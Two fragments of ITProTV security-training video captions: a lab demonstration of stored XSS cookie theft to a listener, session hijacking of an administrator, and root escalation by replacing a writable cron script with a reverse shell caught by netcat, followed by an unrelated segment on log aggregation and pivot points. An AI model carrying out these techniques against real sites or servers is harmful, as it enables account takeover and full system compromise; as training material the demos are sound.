do\n\n555\n00:25:44.910 --> 00:25:45.720\nlong things around here.\n\n556\n00:25:45.720 --> 00:25:47.010\nIt makes it easy to copy and paste.\n\n557\n00:25:47.010 --> 00:25:51.690\nI can do ls,\nI've got this xss cookie stealing.\n\n558\n00:25:51.690 --> 00:25:54.890\nI'm gonna do some session hijacking.\n\n559\n00:25:54.890 --> 00:25:59.330\nI'm gonna use cross-site scripting\nto perform session hijacking.\n\n560\n00:25:59.330 --> 00:26:01.900\nSo what I'm gonna do,\nI'm gonna cap that file, xss.\n\n561\n00:26:03.700 --> 00:26:05.988\nAnd I've got a couple of\ndifferent variations of this.\n\n562\n00:26:05.988 --> 00:26:09.511\nOne's using Javascript,\none's using just regular HTML script.\n\n563\n00:26:09.511 --> 00:26:11.570\nAnd another one using Javascript as well,\n\n564\n00:26:11.570 --> 00:26:14.840\nthat I stole from Tim Holmes,\nhe's a super smart guy.\n\n565\n00:26:14.840 --> 00:26:19.224\nI'm gonna just use my normal one here,\nkeep things simple.\n\n566\n00:26:19.224 --> 00:26:21.310\nCopy bring it over here.\n\n567\n00:26:21.310 --> 00:26:28.833\n[INAUDIBLE] hacker, hacker yeah it's fine\nand I just want to Control+V into here.\n\n568\n00:26:28.833 --> 00:26:33.438\nYou need to change the IP\naddress because the IP\n\n569\n00:26:33.438 --> 00:26:38.407\naddress of my server is different, 6.225.\n\n570\n00:26:38.407 --> 00:26:42.066\nAnd also, I'm already using port 999 for\nanother demonstration, so\n\n571\n00:26:42.066 --> 00:26:43.370\nI'll use port 8888.\n\n572\n00:26:43.370 --> 00:26:47.060\nSo, and there we go, that should work.\n\n573\n00:26:47.060 --> 00:26:51.887\nI'm gonna go ahead and\nfire up my listener here,\n\n574\n00:26:51.887 --> 00:26:56.497\n[INAUDIBLE] lp .8888, and fire that off.\n\n575\n00:26:56.497 --> 00:27:00.430\nAnd I will come in here and\nI will submit the query.\n\n576\n00:27:00.430 --> 00:27:03.350\nAnd get my cross site scripting test,\nit's gonna nail me every time.\n\n577\n00:27:03.350 --> 00:27:04.690\nEvery time someone comes to this page,\n\n578\n00:27:04.690 --> 00:27:08.430\nas long as that script tag is there,\nit's gonna execute.\n\n579\n00:27:08.430 --> 00:27:11.570\nEveryone, until it's gone,\nit will continue to execute this.\n\n580\n00:27:11.570 --> 00:27:14.990\nSo anybody that's visiting this page,\nI've got things going on.\n\n581\n00:27:14.990 --> 00:27:18.600\nNow what I've done is I said,\ncreate a new image, inside of that image,\n\n582\n00:27:18.600 --> 00:27:20.060\nput the document cookie.\n\n583\n00:27:20.060 --> 00:27:23.400\nSo when someone comes to this website,\nwhat's it gonna do?\n\n584\n00:27:23.400 --> 00:27:27.492\nIt's gonna say, create a new image,\ninside of that put the cookie,\n\n585\n00:27:27.492 --> 00:27:29.609\nof the user that has visited the page.\n\n586\n00:27:29.609 --> 00:27:32.250\nWhat happens if the administrator\nvisits the page?\n\n587\n00:27:32.250 --> 00:27:36.030\nThere's going to be a session cookie\nthere, I'm going to steal that.\n\n588\n00:27:36.030 --> 00:27:38.270\nI wonder if I've already done it,\nno, not so far.\n\n589\n00:27:38.270 --> 00:27:40.280\nWe're waiting for it to come through.\n\n590\n00:27:40.280 --> 00:27:41.570\nBasically now it's just a waiting game.\n\n591\n00:27:41.570 --> 00:27:45.670\nNow I know this machine is specific\nset up to have the administrator,\n\n592\n00:27:45.670 --> 00:27:49.690\nI think once a minute access the page.\n\n593\n00:27:49.690 --> 00:27:52.418\n&gt;&gt; Okay.\n&gt;&gt; So there's an administrative user\n\n594\n00:27:52.418 --> 00:27:56.060\naccessing this page from time to time.\n\n595\n00:27:56.060 --> 00:27:59.240\nHopefully we'll see that roll in, we're\njust waiting for that to come through.\n\n596\n00:27:59.240 --> 00:28:01.220\nIf not, I'll kill it and try again.\n\n597\n00:28:01.220 --> 00:28:05.330\nSometimes you gotta redo these things\na couple of times to get them to work.\n\n598\n00:28:05.330 --> 00:28:08.400\nI don't know why, they're weird like that.\n\n599\n00:28:09.700 --> 00:28:11.120\n&gt;&gt; So then once you have that cookie,\n\n600\n00:28:11.120 --> 00:28:15.470\nthat's going to give you the ability\nto impersonate the administrator.\n\n601\n00:28:15.470 --> 00:28:16.040\n&gt;&gt; Right, you got it.\n\n602\n00:28:16.040 --> 00:28:18.290\nSo what I'm gonna do is I'm\ngoing to copy that cookie.\n\n603\n00:28:18.290 --> 00:28:22.090\nAnd I've got a tool built into my\nbrowser that allows me to manipulate\n\n604\n00:28:22.090 --> 00:28:24.170\nthe cookies that my browser is using.\n\n605\n00:28:24.170 --> 00:28:28.420\nI can edit the cookie that I have for\nthis site.\n\n606\n00:28:28.420 --> 00:28:32.450\nYou can say, yeah, that's the cookie I've\ngot now, but I want the cookie to be this.\n\n607\n00:28:32.450 --> 00:28:34.770\nAnd it's called Cookies Manager+, but\nthere's other ones out there, right?\n\n608\n00:28:34.770 --> 00:28:36.378\nYou don't have to\nspecifically use that one.\n\n609\n00:28:36.378 --> 00:28:39.790\nI am gonna Ctrl+C this so\nI can bring it back up.\n\n610\n00:28:39.790 --> 00:28:40.430\nWait for it.\n\n611\n00:28:40.430 --> 00:28:43.200\nI think I did everything right,\nbut we'll see.\n\n612\n00:28:43.200 --> 00:28:45.540\nYeah we're just waiting for\nthat to go through.\n\n613\n00:28:45.540 --> 00:28:46.845\nI see that the thing is there.\n\n614\n00:28:46.845 --> 00:28:49.150\nSo we're just listening,\nwaiting for that to come through.\n\n615\n00:28:49.150 --> 00:28:53.170\nHopefully I haven't made any mistakes,\nif so we'll fix it.\n\n616\n00:28:53.170 --> 00:28:54.010\nThis is the basic idea.\n\n617\n00:28:55.190 --> 00:28:59.890\nAnd let's see here what I will do though\nlet's show you what I'll do cookies.\n\n618\n00:28:59.890 --> 00:29:04.708\nHere is Cookies Manager+ I can search\nthese sites that will show me the cookies\n\n619\n00:29:04.708 --> 00:29:05.586\nif I have any.\n\n620\n00:29:05.586 --> 00:29:08.210\nSo far it doesn't have any,\nso I'm just waiting.\n\n621\n00:29:08.210 --> 00:29:11.030\n&gt;&gt; Yeah I guess no guarantee is how\nlong when the administrator is gonna\n\n622\n00:29:11.030 --> 00:29:11.670\nlog in right?\n\n623\n00:29:11.670 --> 00:29:14.980\n&gt;&gt; No I know yeah, sometimes it can\nbe a waiting game and then we do have\n\n624\n00:29:14.980 --> 00:29:19.060\nthe crunch of television time on top of us\nso we feel the pressure a little bit more.\n\n625\n00:29:19.060 --> 00:29:22.470\nBut I actually think it came through, now\nthat I'm looking behind the screen there.\n\n626\n00:29:22.470 --> 00:29:23.560\nThere we go, there it is.\n\n627\n00:29:23.560 --> 00:29:26.870\nSo php session right there.\n\n628\n00:29:26.870 --> 00:29:29.140\nSo I just need to steal that cookie.\n\n629\n00:29:29.140 --> 00:29:30.090\nCopy that off.\n\n630\n00:29:31.170 --> 00:29:33.060\nAnd now we'll come over here.\n\n631\n00:29:33.060 --> 00:29:38.190\nWe will go to our little tool here,\nCookies Manager+, look for that.\n\n632\n00:29:38.190 --> 00:29:40.290\nI don't have one yet,\nmaybe I just need to refresh.\n\n633\n00:29:40.290 --> 00:29:44.040\n&gt;&gt; Heard that some of the live viewers\nare getting pretty upset with you for\n\n634\n00:29:44.040 --> 00:29:44.960\nstealing everybodies cookies.\n\n635\n00:29:44.960 --> 00:29:47.590\n&gt;&gt; Well,\nyou know I'm the cookie monster, right?\n\n636\n00:29:47.590 --> 00:29:48.840\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] Let me just bounce around\n\n637\n00:29:48.840 --> 00:29:52.700\nthis blog here and\nsee if we can't get a session going here.\n\n638\n00:29:52.700 --> 00:29:53.800\nHello cross-site scripting!\n\n639\n00:29:53.800 --> 00:29:54.890\nYep, you're the devil.\n\n640\n00:29:54.890 --> 00:29:58.940\nTypically you just go to these things and\nit just starts issuing cookies.\n\n641\n00:29:58.940 --> 00:30:02.220\nI probably just haven't\nhit the right area here.\n\n642\n00:30:02.220 --> 00:30:02.910\nI've been to the home.\n\n643\n00:30:02.910 --> 00:30:03.740\nYou know what though?\n\n644\n00:30:03.740 --> 00:30:05.140\nI haven't been to the admin section.\n\n645\n00:30:05.140 --> 00:30:06.840\nI bet I've got to go to the admin section.\n\n646\n00:30:06.840 --> 00:30:07.620\nLet me click on that.\n\n647\n00:30:07.620 --> 00:30:11.590\nYeah there's the login area and\nof course I can try to login.\n\n648\n00:30:11.590 --> 00:30:15.760\nI'm the admin yeah with my\ncool password of admin.\n\n649\n00:30:15.760 --> 00:30:21.129\nSo I bet I'm getting a session cookie now,\nlet's see if that works.\n\n650\n00:30:22.750 --> 00:30:24.950\nSo let's, this is our tool, there we go.\n\n651\n00:30:24.950 --> 00:30:27.110\nCookies Manager, click that.\n\n652\n00:30:27.110 --> 00:30:29.740\nThere we go,\nmow it's giving me a session ID.\n\n653\n00:30:29.740 --> 00:30:31.490\nI can go in here, copy this out.\n\n654\n00:30:31.490 --> 00:30:33.180\nHoping that it hasn't been too long.\n\n655\n00:30:34.370 --> 00:30:38.780\nPaste that in, save, hit close.\n\n656\n00:30:38.780 --> 00:30:44.530\nAnd now I should just be able\nto go to the Admin area and\n\n657\n00:30:44.530 --> 00:30:45.700\nthere we go,\n&gt;&gt; Voila.\n\n658\n00:30:45.700 --> 00:30:49.190\n&gt;&gt; Right, so because that session\ncookie was for the administrator.\n\n659\n00:30:49.190 --> 00:30:52.330\nI was able to steal that using\ncross site scripting, put that in,\n\n660\n00:30:52.330 --> 00:30:53.780\nI'm able to impersonate for\n\n661\n00:30:53.780 --> 00:30:58.640\nthe system that I am the administrator\ncuz that's session hijacking.\n\n662\n00:30:58.640 --> 00:30:59.160\n&gt;&gt; Too easy.\n\n663\n00:30:59.160 --> 00:31:00.750\n&gt;&gt; Yeah, way too easy.\n\n664\n00:31:00.750 --> 00:31:03.750\nThe other one I wanna show you\nguys is privilege escalation.\n\n665\n00:31:03.750 --> 00:31:05.120\nVery cool stuff.\n\n666\n00:31:05.120 --> 00:31:09.690\nI already compromised a server\nwhich is over here running.\n\n667\n00:31:09.690 --> 00:31:11.270\nIt's a WordPress server.\n\n668\n00:31:12.340 --> 00:31:16.970\nRight now I uploaded a php\nreverse shell script to it.\n\n669\n00:31:16.970 --> 00:31:22.540\nAnd I was able to fire that off, and if\nI go to another screen, where's that at?\n\n670\n00:31:22.540 --> 00:31:24.975\nThere we go.\nYou'll see there's my terminal\n\n671\n00:31:24.975 --> 00:31:25.960\nwaiting for me.\n\n672\n00:31:25.960 --> 00:31:28.268\nI'll say, who am I?\n\n673\n00:31:28.268 --> 00:31:31.350\nAnd I'm www.data so\n\n674\n00:31:31.350 --> 00:31:37.170\nit's using the web service\nuser to compromise.\n\n675\n00:31:37.170 --> 00:31:39.260\nSo I'm access but I'm not a root user.\n\n676\n00:31:39.260 --> 00:31:43.710\nI want to elevate my privileges, all\nright, so that's what we're trying to do.\n\n677\n00:31:43.710 --> 00:31:46.890\nSo what I can do is start looking for\ndifferent ways to enumerate.\n\n678\n00:31:46.890 --> 00:31:50.200\nBasically, this is all about permissions,\n\n679\n00:31:50.200 --> 00:31:53.355\nfinding some way in which\nI'm able to do something.\n\n680\n00:31:53.355 --> 00:31:55.323\nThat' one of the ways, let me put it out.\n\n681\n00:31:55.323 --> 00:31:57.556\nIt's one of the ways that you can do this.\n\n682\n00:31:57.556 --> 00:32:01.568\nAnother way is that there are inherent\nflaws in the system itself.\n\n683\n00:32:01.568 --> 00:32:05.339\nThe operating system one of\nthe protocols that it's using, or\n\n684\n00:32:05.339 --> 00:32:08.410\nservices that it's using,\nhas an inherent flaw.\n\n685\n00:32:08.410 --> 00:32:13.911\nThat allows you to, if you were to compile\nsome code, some proof of concept code,\n\n686\n00:32:13.911 --> 00:32:17.594\nand fire it off it would then\nelevate your privileges.\n\n687\n00:32:17.594 --> 00:32:19.793\nThat's definitely\na legitimate way to do it.\n\n688\n00:32:19.793 --> 00:32:23.471\nIt's a very difficult way to do it\na lot of times, but it is legit and\n\n689\n00:32:23.471 --> 00:32:24.940\ncan be done with this way.\n\n690\n00:32:24.940 --> 00:32:26.717\nBut this is the more typical way,\n\n691\n00:32:26.717 --> 00:32:30.731\nwhich can be someone just set\nthe permissions wrong on something, right.\n\n692\n00:32:30.731 --> 00:32:35.285\nSo I did some enumeration here and\none of the main places\n\n693\n00:32:35.285 --> 00:32:39.845\nthat you go is you look for\nsticky bit said, guit said.\n\n694\n00:32:39.845 --> 00:32:43.334\nThings that are going to\nrun as a different user so\n\n695\n00:32:43.334 --> 00:32:47.175\nthat I can get access to that,\nbut allows me to run it.\n\n696\n00:32:47.175 --> 00:32:52.932\nHere it was in the cron job so\nI just did cat /etc/cron I think,\n\n697\n00:32:52.932 --> 00:32:56.873\nthat's right I can't use, can't use that.\n\n698\n00:32:56.873 --> 00:33:04.130\nSo here we go, I saw this right here,\nthis /usr/local/bin/cleanup as roots.\n\n699\n00:33:04.130 --> 00:33:08.082\nSo that's the only cron job that's\nthere so I wanna check that out.\n\n700\n00:33:08.082 --> 00:33:11.658\nSo I cd /user/local/bin, and\n\n701\n00:33:11.658 --> 00:33:17.148\nthen I add LS in there and\nit says cleanup, LS-L and\n\n702\n00:33:17.148 --> 00:33:22.272\nI see, look at these permissions,\nall right.\n\n703\n00:33:22.272 --> 00:33:22.962\n&gt;&gt; That doesn't look good.\n\n704\n00:33:22.962 --> 00:33:26.285\n&gt;&gt; So this is owned by a root and\n\n705\n00:33:26.285 --> 00:33:31.641\nit allows me to run it,\nbut also write to it.\n\n706\n00:33:31.641 --> 00:33:32.250\nGuess what?\n\n707\n00:33:32.250 --> 00:33:35.161\nIf it runs as root it's set as a cron job,\n\n708\n00:33:35.161 --> 00:33:40.399\nit means it's going to automatically\nrun as root x amount of times a day.\n\n709\n00:33:40.399 --> 00:33:41.093\n&gt;&gt; Very incredible.\n\n710\n00:33:41.093 --> 00:33:42.476\n&gt;&gt; Yeah, yeah, and\nit's writable by everyone.\n\n711\n00:33:42.476 --> 00:33:45.428\n&gt;&gt; So it means I can change\nit to whatever I want.\n\n712\n00:33:45.428 --> 00:33:46.493\n&gt;&gt; Right, exactly, so\n\n713\n00:33:46.493 --> 00:33:50.056\nyou see improper permission setting\nwill lead this to be exploitable.\n\n714\n00:33:50.056 --> 00:33:53.097\nSo all I would have to do is go in here,\n\n715\n00:33:53.097 --> 00:33:57.331\nwhich I've already done,\nlike this cd /temp ls.\n\n716\n00:33:57.331 --> 00:34:01.888\nI've created a cleanup so\nI go cat my cleanup, actually,\n\n717\n00:34:01.888 --> 00:34:04.306\nlet's look at that one first.\n\n718\n00:34:04.306 --> 00:34:09.867\nCat /usr/local/bin/cleanup,\nall right, here's the original thing.\n\n719\n00:34:09.867 --> 00:34:10.971\nWhat is it doing?\n\n720\n00:34:10.971 --> 00:34:19.424\nIt's a shell script that removes log files\nfrom apache two, clean those log files.\n\n721\n00:34:19.424 --> 00:34:22.043\nSo instead of forgetting to do it,\nyou created a script.\n\n722\n00:34:22.043 --> 00:34:24.149\nAnd improperly set the permissions for\n\n723\n00:34:24.149 --> 00:34:28.185\nrunning that script before he put it\ninto the cron job, or she, as it were.\n\n724\n00:34:28.185 --> 00:34:31.935\nRight, so now all I got to do is change\nthis to be, I don't know, a reverse shell.\n\n725\n00:34:31.935 --> 00:34:34.490\nAnd guess what?\n\n726\n00:34:34.490 --> 00:34:39.524\nIt'll run as root and so when it pops\nthe shell, guess what's it's gonna be?\n\n727\n00:34:39.524 --> 00:34:44.549\nSo let's do that, I'm gonna copy,\nhere's mine, cat cleanup.\n\n728\n00:34:44.549 --> 00:34:46.687\nI wanna copy this over there.\n\n729\n00:34:46.687 --> 00:34:51.606\nSo it's just a Python script that's\ncreating a socket on port 3333 to this\n\n730\n00:34:51.606 --> 00:34:55.422\nmachine so that's where it's\ngonna look for the listener.\n\n731\n00:34:55.422 --> 00:34:57.891\nLet me open up a listener here,\nlet me get a new window going.\n\n732\n00:35:00.265 --> 00:35:04.068\nAnd I will make it a little bit larger for\nus.\n\n733\n00:35:04.068 --> 00:35:07.373\nCome back to it here, but I'm just gonna\ncopy this file because I have write\n\n734\n00:35:07.373 --> 00:35:09.794\npermissions I can just straight\nup copy it into there.\n\n735\n00:35:09.794 --> 00:35:19.261\nSo copy cleanup/user/local/bin/cleanup,\nthere you go.\n\n736\n00:35:19.261 --> 00:35:24.092\nCome over here,\nfire off my net cat listener, and\n\n737\n00:35:24.092 --> 00:35:30.436\nthat should be LP3333, and\nwait for the cron job to execute.\n\n738\n00:35:30.436 --> 00:35:37.089\nAs it executes I should have a shell to\nthat machine that is running as roots.\n\n739\n00:35:37.089 --> 00:35:39.942\nAnd it gives me full access\nto the system so very,\n\n740\n00:35:39.942 --> 00:35:43.366\nvery dangerous when it comes\nto privileged escalations.\n\n741\n00:35:43.366 --> 00:35:46.733\nSome things we have to look out for,\ndefinitely be scanning your systems for\n\n742\n00:35:46.733 --> 00:35:49.431\nold versions of things or\nthat there's known exploit code.\n\n743\n00:35:49.431 --> 00:35:54.021\nYou can use SearchSploit which is built\nin poly Linux or just go to exploit DB.\n\n744\n00:35:54.021 --> 00:35:57.130\nOther resources are out there as well.\n\n745\n00:35:57.130 --> 00:36:01.558\nYou could just look up,\nI'm running version X of this system,\n\n746\n00:36:01.558 --> 00:36:06.422\nmaybe it's just Linux,\nlook up Linux Kernel 3 point such, right.\n\n747\n00:36:06.422 --> 00:36:10.734\nAre there Prevx exploits out there for\nme and see if you're vulnerable.\n\n748\n00:36:10.734 --> 00:36:13.020\nIf you are you need to do some mitigation,\nright.\n\n749\n00:36:13.020 --> 00:36:16.646\nSo I've all ready popped a shell and\nyou'll notice.\n\n750\n00:36:16.646 --> 00:36:19.344\nLet me give you a little\nbigger action there.\n\n751\n00:36:19.344 --> 00:36:21.167\nMike, that does look like a root symbol.\n\n752\n00:36:21.167 --> 00:36:22.211\n&gt;&gt; It does, who are you?\n\n753\n00:36:22.211 --> 00:36:24.711\n&gt;&gt; Who am I, I am roots and\nthere's the action.\n\n754\n00:36:24.711 --> 00:36:28.321\nNow, I have full system access to\nthis thing, I'm the king, I'm king,\n\n755\n00:36:28.321 --> 00:36:30.021\nI can put my own backdoors in here.\n\n756\n00:36:30.021 --> 00:36:33.985\nHide my APT, I'm off to the races so\nvery important.\n\n757\n00:36:33.985 --> 00:36:38.705\nI could drop a rootkit in here to give me\nthat persistence that I'm looking for,\n\n758\n00:36:38.705 --> 00:36:41.250\neven if they do find my backdoors, right.\n\n759\n00:36:41.250 --> 00:36:43.793\nSo there you go, Mike.\n\n760\n00:36:43.793 --> 00:36:46.955\n&gt;&gt; All right, Daniel, great\ndemonstrations, great explanations when it\n\n761\n00:36:46.955 --> 00:36:49.716\ncomes to identity and\naccess management, we appreciate that.\n\n762\n00:36:49.716 --> 00:36:50.326\n&gt;&gt; No problem.\n\n763\n00:36:50.326 --> 00:36:52.594\n&gt;&gt; We hope everybody out there\nenjoyed watching this one,\n\n764\n00:36:52.594 --> 00:36:54.387\nmake sure you go back and\ncheck part one out.\n\n765\n00:36:54.387 --> 00:36:57.512\nFor now, signing off for\nITProTV I've been your host Mike Rodrick.\n\n766\n00:36:57.512 --> 00:36:58.284\n&gt;&gt;

the viewers out there.\n\n7\n00:00:12.826 --> 00:00:16.830\nThank you for tuning into ITProTV and\nchoosing us for your learning needs.\n\n8\n00:00:16.830 --> 00:00:18.140\nI'm your show host, Wes Bryan.\n\n9\n00:00:18.140 --> 00:00:20.870\nAnd in today's episode,\nI am glad to be jumping in on this one.\n\n10\n00:00:20.870 --> 00:00:24.293\nWe have more of that SISA Plus and\na person who needs no introduction so\n\n11\n00:00:24.293 --> 00:00:26.960\nI'm gonna give him one anyways\nhere is Mr Dan Lowrie.\n\n12\n00:00:26.960 --> 00:00:27.775\nDan how are we doing today?\n\n13\n00:00:27.775 --> 00:00:30.380\n&gt;&gt; I'm doing great and I'm so glad you\nintroduced me because I forgot who I was\n\n14\n00:00:30.380 --> 00:00:30.950\nfor a second\n&gt;&gt; Good,\n\n15\n00:00:30.950 --> 00:00:32.980\ngood\n&gt;&gt; Thanks for reminding me but\n\n16\n00:00:32.980 --> 00:00:37.290\nwe are back for the SISA Plus series and\ntoday we're gonna be taking a look at\n\n17\n00:00:37.290 --> 00:00:40.070\ncompensating controls and\ndesign and architecture.\n\n18\n00:00:40.070 --> 00:00:43.370\nWhen it comes to security inside\nof your network design, that is,\n\n19\n00:00:43.370 --> 00:00:44.910\nand architectures inside of that.\n\n20\n00:00:44.910 --> 00:00:46.280\nBut that's what we're\ngonna take a look at.\n\n21\n00:00:46.280 --> 00:00:48.189\nWe've got a lot of ground\nto cover in this, so\n\n22\n00:00:48.189 --> 00:00:50.010\nit's probably gonna be a multi-parter.\n\n23\n00:00:50.010 --> 00:00:52.634\nSo I'm just gonna pre-warn you on that.\n\n24\n00:00:52.634 --> 00:00:55.890\nCuz I don't want you to thinking,\nDan's kind of going along here.\n\n25\n00:00:55.890 --> 00:00:59.650\nWe barely scratched the surface on\nthe objectives in the domain here.\n\n26\n00:00:59.650 --> 00:01:02.620\nBut so, be prepared for that.\n\n27\n00:01:02.620 --> 00:01:04.660\n&gt;&gt; You know one of\nthe things I think of Dan,\n\n28\n00:01:04.660 --> 00:01:07.660\nbeen working with some Cloud technologies\nand hosting some of those shows and\n\n29\n00:01:07.660 --> 00:01:10.910\nI know that we can have\nmassive amounts of data.\n\n30\n00:01:10.910 --> 00:01:14.340\nWe can have data coming in from\nthousands of different end points.\n\n31\n00:01:14.340 --> 00:01:15.740\nMaybe even millions.\n\n32\n00:01:15.740 --> 00:01:17.390\nHow we make sense of this information?\n\n33\n00:01:17.390 --> 00:01:18.670\n&gt;&gt; Yeah, it's a really good question.\n\n34\n00:01:18.670 --> 00:01:21.790\nWe've been discussing that\nthroughout this entire series.\n\n35\n00:01:21.790 --> 00:01:23.030\nWe've hinted about this.\n\n36\n00:01:23.030 --> 00:01:25.022\nWe've touched on it in\ncertain other spots as well.\n\n37\n00:01:25.022 --> 00:01:27.740\nWe're gonna take a little\nbit more of a look at\n\n38\n00:01:27.740 --> 00:01:32.120\nwhat Wes is alluding to which\nis basically data aggregation.\n\n39\n00:01:32.120 --> 00:01:36.400\nHow do we get the information that we\nneed in a way that we can digest it?\n\n40\n00:01:36.400 --> 00:01:39.090\nAnd something that's going to\nmake sense of it so we're not.\n\n41\n00:01:39.090 --> 00:01:43.490\nJust having the scatter-gun approach of,\nwell yeah I've got stuff over here and\n\n42\n00:01:43.490 --> 00:01:46.040\nI've got stuff over there,\nhow do I get it all together?\n\n43\n00:01:46.040 --> 00:01:48.420\nHow do I manage this data that we have?\n\n44\n00:01:48.420 --> 00:01:50.250\nWe're gonna talk about that,\nwe're also gonna talk about,\n\n45\n00:01:50.250 --> 00:01:54.510\nI guess we'll start off with this,\nis basically the concept of that,\n\n46\n00:01:54.510 --> 00:01:56.680\nthat data aggregation and\nthat correlation.\n\n47\n00:01:56.680 --> 00:02:00.040\nI think this is the specific objective\nthat they want for the exam.\n\n48\n00:02:00.040 --> 00:02:04.940\nBut this is rounding up logs and\nout it in some centralized form so\n\n49\n00:02:04.940 --> 00:02:09.340\nthat we do have the ability to go,\nokay, this is a little easier for\n\n50\n00:02:09.340 --> 00:02:11.190\nme to understand what's happening.\n\n51\n00:02:11.190 --> 00:02:15.860\nBecause now my data has not only been\ncollected from all my multiple systems,\n\n52\n00:02:15.860 --> 00:02:17.780\nbrought into some centralized system.\n\n53\n00:02:17.780 --> 00:02:20.400\nBut it's also been correlated, right?\n\n54\n00:02:20.400 --> 00:02:23.300\nIt says this is a category of data, so\n\n55\n00:02:23.300 --> 00:02:26.210\nif I wanna know more\nabout authorization logs.\n\n56\n00:02:26.210 --> 00:02:28.660\nWell, I can go to authorization logs and\n\n57\n00:02:28.660 --> 00:02:33.440\nsee all the authorization log information\nthat I have, for each one of my systems.\n\n58\n00:02:33.440 --> 00:02:38.332\nSo, it makes that a whole lot simpler to\nlook at, see and start to find maybe some\n\n59\n00:02:38.332 --> 00:02:43.080\npatterns of, well it looks like someone's\ntrying to, either have a problem\n\n60\n00:02:43.080 --> 00:02:47.634\nwith password policy here because\npeople are having trouble logging in.\n\n61\n00:02:47.634 --> 00:02:52.443\nOr I've got a thread actor that's maybe\nperforming some sort of brute force\n\n62\n00:02:52.443 --> 00:02:57.476\nattack against my system, because I'm\nseeing a bunch of failures when it comes\n\n63\n00:02:57.476 --> 00:03:02.980\nto individual user accounts and they're\nhappening in succession at multiple times.\n\n64\n00:03:02.980 --> 00:03:07.156\nSo that's the kind of thing you wanna\nlook at and with that data aggregation,\n\n65\n00:03:07.156 --> 00:03:10.160\nyou would be able to see\nthat a whole lot easier.\n\n66\n00:03:10.160 --> 00:03:13.240\nThen, okay, well now I've got to go into\nthis log and I've got to go in that log.\n\n67\n00:03:13.240 --> 00:03:14.360\nLet me go in this system.\n\n68\n00:03:14.360 --> 00:03:15.910\nI got to look at the exact same log,\n\n69\n00:03:15.910 --> 00:03:20.690\nyou start to see how as you get more\ndesperate, it becomes more difficult for\n\n70\n00:03:20.690 --> 00:03:26.770\nus as the security administrator to\ndiscern if there might be a problem.\n\n71\n00:03:26.770 --> 00:03:31.060\nSo data aggregation and\ncorrelation becomes a very helpful thing.\n\n72\n00:03:31.060 --> 00:03:33.170\nSo it separates their logs and\ntheir respective categories,\n\n73\n00:03:33.170 --> 00:03:34.290\nwe've talked about that.\n\n74\n00:03:34.290 --> 00:03:37.930\nEach system can act as\na supplement to the other systems.\n\n75\n00:03:37.930 --> 00:03:40.290\nBecause, think of it this way.\n\n76\n00:03:40.290 --> 00:03:43.673\nI might have a system in my DMZ and\nI kind of expect for\n\n77\n00:03:43.673 --> 00:03:46.490\nit to be attacked in certain ways.\n\n78\n00:03:46.490 --> 00:03:48.700\nAnd maybe it's just\nhousing a static website.\n\n79\n00:03:48.700 --> 00:03:50.600\nThere's nothing crazy going on.\n\n80\n00:03:50.600 --> 00:03:53.160\nIt's just a place for\npeople to come to get information, right?\n\n81\n00:03:53.160 --> 00:03:55.998\nThis is for instance,\na hypothetical if you will,\n\n82\n00:03:55.998 --> 00:03:58.652\na hypoclavical,\nthat's all I can say, okay?\n\n83\n00:03:58.652 --> 00:04:03.090\n[LAUGH] But am I going to be\nchecking authorization logs as, or\n\n84\n00:04:03.090 --> 00:04:04.790\nmaybe just monitoring in general,\n\n85\n00:04:04.790 --> 00:04:09.800\nam I gonna be monitoring that as heavily\nas I would be on my database system.\n\n86\n00:04:09.800 --> 00:04:13.680\nProbably not, but\nthat doesn't mean I'm not monitoring it.\n\n87\n00:04:13.680 --> 00:04:18.570\nBut that also doesn't mean that people\nthat are wanting to attack my organization\n\n88\n00:04:18.570 --> 00:04:20.340\ndon't see that go, maybe it's going.\n\n89\n00:04:20.340 --> 00:04:23.100\nThey don't know,\nremember they have the curtain up,\n\n90\n00:04:23.100 --> 00:04:25.170\nthey have to push the curtain aside.\n\n91\n00:04:25.170 --> 00:04:25.690\nHow do they do that?\n\n92\n00:04:25.690 --> 00:04:28.620\nWell they look at all the systems\nthat they do have access to.\n\n93\n00:04:28.620 --> 00:04:32.710\nSo by the fact that I'm monitoring\na system that while I might not\n\n94\n00:04:32.710 --> 00:04:37.730\nbe monitoring as robustly as I would,\nsay something like my database,\n\n95\n00:04:37.730 --> 00:04:40.840\nI do get information about how\nmy company's being attacked.\n\n96\n00:04:40.840 --> 00:04:45.530\nSo that's supplementing my security\nposture when it comes to the stuff\n\n97\n00:04:45.530 --> 00:04:46.810\nthat I am worried about.\n\n98\n00:04:46.810 --> 00:04:49.330\nI'm seeing, well what kind of\nport scans are they running?\n\n99\n00:04:49.330 --> 00:04:50.320\nHow often are they running it.\n\n100\n00:04:50.320 --> 00:04:57.760\nWhere is it coming from, so even if though\nif they've got access to that web server.\n\n101\n00:04:57.760 --> 00:05:02.210\nI don't want that to happen, but I'm gonna\nuse that information almost becomes like\n\n102\n00:05:02.210 --> 00:05:05.210\na honey pot at that point, right?\n\n103\n00:05:05.210 --> 00:05:08.660\n&gt;&gt; Do you find that maybe some of\nthe lesser monitor systems can be targets\n\n104\n00:05:08.660 --> 00:05:12.080\nmore specifically for like pivot\npoints if somebody's making an attack?\n\n105\n00:05:12.080 --> 00:05:12.620\n&gt;&gt; Yeah.\n\n106\n00:05:12.620 --> 00:05:15.020\nIt's a very common attack vector.\n\n107\n00:05:15.020 --> 00:05:18.660\nIt's to say well this seems\nto be a very static website.\n\n108\n00:05:18.660 --> 00:05:19.940\nSomething like that.\n\n109\n00:05:19.940 --> 00:05:25.230\nA little FTP server sitting off in\nthe distant not really doing much.\n\n110\n00:05:25.230 --> 00:05:28.940\nServing up very innocuous data\n\n111\n00:05:28.940 --> 00:05:31.870\nto just about anyone maybe\nit's got anonymous login.\n\n112\n00:05:31.870 --> 00:05:36.400\nYeah well you know what maybe\nthe security on that's not up to snuff.\n\n113\n00:05:36.400 --> 00:05:38.900\nSo like Wes said if I\ncan gain access to that\n\n114\n00:05:38.900 --> 00:05:42.530\nwhat do I then gain access\nto as that as a doorway?\n\n115\n00:05:42.530 --> 00:05:44.740\nPutting the toe in the door.\n\n116\n00:05:44.740 --> 00:05:45.670\nTo get into the system,\n\n117\n00:05:45.670 --> 00:05:49.420\nso yes, Wes answer your question,\nthey can definitely be pivot points,\n\n118\n00:05:49.420 --> 00:05:52.690\ndepending on how you actually\ndesign the network and connect it.\n\n119\n00:05:52.690 --> 00:05:54.940\n&gt;&gt; Most of your pieces I know,\nmoving pieces right?\n\n120\n00:05:54.940 --> 00:05:57.249\nSo hence moving targets\na very holistic in nature.\n\n121\n00:05:57.249 --> 